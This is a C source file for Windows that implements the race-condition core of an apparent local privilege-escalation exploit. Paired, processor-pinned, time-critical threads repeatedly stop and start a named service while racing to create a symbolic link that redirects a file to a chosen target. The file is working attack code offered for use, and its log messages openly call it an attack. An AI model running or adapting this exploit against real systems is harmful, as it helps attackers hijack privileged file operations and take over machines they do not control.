#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "Threading.h"
#include "ServiceUtils.h"

BOOL g_Success = FALSE;

DWORD CheckProcessors(void)
{
	SYSTEM_INFO SystemInfo = { 0 };

	/* Check if we have more than 2 processors as attack will take too long with less */
	GetSystemInfo(&SystemInfo);
	if (SystemInfo.dwNumberOfProcessors < 2)
	{
		printf("[!] FATAL: You don't have enough processors, exiting!\n");
		exit(-1);
	}

	DWORD NumProcessors = SystemInfo.dwNumberOfProcessors;
	return NumProcessors;
}


DWORD WINAPI StartServiceThread(LPVOID lpParam)
{

	HANDLE              DriverHandle = NULL;
	PIO_THREAD_PARAM    IoThreadParam = NULL;

	DWORD				BytesReturned = 0;
	int					err = 0;

	/* Get pointer to thread parameter structure */
	IoThreadParam = (PIO_THREAD_PARAM)lpParam;

	printf("(+) Changing user buffer on processor %d\n", GetCurrentProcessorNumber());

	DoStopSvc(IoThreadParam->lpwServiceName);

	while (!g_Success)
	{
		if (err % 10000 == 0) {
			printf("(*) Trying to start service %ws\n", IoThreadParam->lpwServiceName);
		}

		if (DoStartSvc(IoThreadParam->lpwServiceName)) {
			g_Success = TRUE;
			break;
		}
		err++;
		if (err == 100000000) {
			g_Success = TRUE;
		}
	}

	return EXIT_SUCCESS;
}

DWORD WINAPI CreateSymlinkThread(LPVOID lpParam)
{

	HANDLE              DriverHandle = NULL;
	PIO_THREAD_PARAM    IoThreadParam = NULL;

	DWORD				BytesReturned = 0;
	int					err = 0;

	/* Get pointer to thread parameter structure */
	IoThreadParam = (PIO_THREAD_PARAM)lpParam;

	DWORD LastError = 0;
	while (!g_Success && !LastError)
	{		
		if (err % 10000 == 0) {
			printf("(*) Trying to create symlink %s <<===>> %s\n", IoThreadParam->lpSymlinkFileName, IoThreadParam->lpTargetFileName);
		}

		LastError = CreateSymbolicLinkA(IoThreadParam->lpSymlinkFileName, IoThreadParam->lpTargetFileName, SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE);
		err++;

		if (err == 500000) {
			printf("(-) Error Creating Symbolic Link: %08x\n", GetLastError());
			break;
		}
	}

	return EXIT_SUCCESS;
}

void DriverRace(LPCWSTR lpwServiceName, LPCSTR lpSymlinkFileName, LPCSTR lpTargetFileName) {

	DWORD numProcessors = CheckProcessors();

	BYTE basePriority = THREAD_PRIORITY_ABOVE_NORMAL;

	/* Allocate IO_THREAD_PARAM struct */
	PIO_THREAD_PARAM IoThreadParam = (PIO_THREAD_PARAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_THREAD_PARAM));
	if (!IoThreadParam)
	{
		printf("[!] FATAL: Failed to allocate memory for IO thread!\n");
		return;
	}

	/* Initialise IO_THREAD_PARAM struct members */
	IoThreadParam->lpSymlinkFileName = lpSymlinkFileName;
	IoThreadParam->lpTargetFileName = lpTargetFileName;
	IoThreadParam->lpwServiceName = lpwServiceName;

	for (BYTE i = 0; i < numProcessors; i += 2)
	{
		HANDLE startServiceThread = CreateThread(NULL, NULL, StartServiceThread, (LPVOID)IoThreadParam, CREATE_SUSPENDED, NULL);
		HANDLE symlinkThread = CreateThread(NULL, NULL, CreateSymlinkThread, (LPVOID)IoThreadParam, CREATE_SUSPENDED, NULL);
		if (!startServiceThread || !symlinkThread)
		{
			printf("[!] FATAL: Unable to create threads!\n");
			return;
		}

		const HANDLE hThreadArray[2] = { startServiceThread, symlinkThread };

		if (!SetThreadPriority(startServiceThread, THREAD_PRIORITY_TIME_CRITICAL) || !SetThreadPriority(symlinkThread, THREAD_PRIORITY_TIME_CRITICAL))
		{
			printf("[!] FATAL: Unable to set thread priority to highest!\n");
		}

		printf("(+) Set StartServiceThread Priority to %u\n", GetThreadPriority(startServiceThread));
		printf("(+) Set CreateSymlinkThread Priority to %u\n", GetThreadPriority(symlinkThread));

		if (!SetThreadAffinityMask(startServiceThread, basePriority << i) || !SetThreadAffinityMask(symlinkThread, basePriority << i + 1))
		{
			printf("[!] FATAL: Unable to set thread affinity!\n");
		}

		ResumeThread(symlinkThread);
		ResumeThread(startServiceThread);

		if (WaitForMultipleObjects(numProcessors, hThreadArray, TRUE, INFINITE))
		{
			TerminateThread(startServiceThread, EXIT_SUCCESS);
			CloseHandle(startServiceThread);
			printf("(+) Terminated StartServiceThread!\n");
			TerminateThread(symlinkThread, EXIT_SUCCESS);
			CloseHandle(symlinkThread);
			printf("(+) Terminated CreateSymlinkThread!\n");
		}

	}
}
